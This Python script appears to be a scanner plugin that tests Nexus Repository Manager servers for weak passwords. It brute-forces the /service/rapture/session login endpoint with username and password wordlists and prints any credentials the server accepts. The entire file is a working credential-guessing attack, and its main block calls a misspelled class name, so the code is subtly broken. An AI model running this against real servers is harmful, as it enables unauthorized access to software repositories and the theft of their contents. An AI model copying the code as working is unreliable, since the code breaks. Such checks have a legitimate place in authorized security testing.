#!/usr/bin/env python3

'''
name: Nexus弱口令漏洞
description: Nexus弱口令漏洞
'''

import base64
from app.lib.utils.request import request

class Nexus_Weakpwd_BaseVerify:
    def __init__(self, url):
        self.url = url
        self.headers = {
            'User-Agent': "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:63.0) Gecko/20100101 Firefox/63.0",
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
        }

    def run(self):
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        url = self.url + "/service/rapture/session"
        for user in open('app/username.txt', 'r', encoding = 'utf-8').readlines():
            user = user.strip()
            for pwd in open('app/password.txt', 'r', encoding = 'utf-8').readlines():
                if pwd != '':
                    pwd = pwd.strip()
                data = {'username':base64.b64encode(user.encode()).decode(), 'password':base64.b64encode(pwd.encode()).decode()}
                try:
                    req = request.post(url, headers = self.headers, data = data)
                    if req.status_code == 204 or req.status_code == 405:
                        result = "user: %s pwd: %s" %(user, pwd)
                        print('存在Nexus弱口令漏洞,弱口令为',result)
                        return True
                except Exception as e:
                    print(e)
                finally:
                    pass
        print('不存在Nexus弱口令漏洞')
        return False
if __name__ == '__main__':
    Nexus_Weakwd = Nexus_Weakwd_BaseVerify('http://192.168.30.242:8081')
    Nexus_Weakwd.run()